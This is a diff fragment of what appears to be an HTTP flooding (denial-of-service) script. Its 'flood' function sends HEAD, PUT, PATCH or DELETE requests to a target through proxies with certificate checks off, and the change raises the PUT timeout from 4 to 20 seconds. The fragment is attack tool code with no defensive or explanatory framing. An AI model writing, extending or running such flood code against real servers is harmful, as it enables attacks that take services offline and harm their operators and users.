@@ -51,7 +51,7 @@ def flood(target,domainname,attack,sock):
             elif attack =='head':
                 r = s.head(target, params=payload, headers=headers, timeout=4 ,verify=False,proxies=proxies)
             elif attack =='put':
-                r = s.put(target, params=payload, headers=headers, timeout=4 ,verify=False,proxies=proxies)
+                r = s.put(target, params=payload, headers=headers, timeout=20 ,verify=False,proxies=proxies)
             elif attack =='patch':
                 r = s.patch(target, params=payload, headers=headers, timeout=4 ,verify=False,proxies=proxies)
             elif attack =='delete':
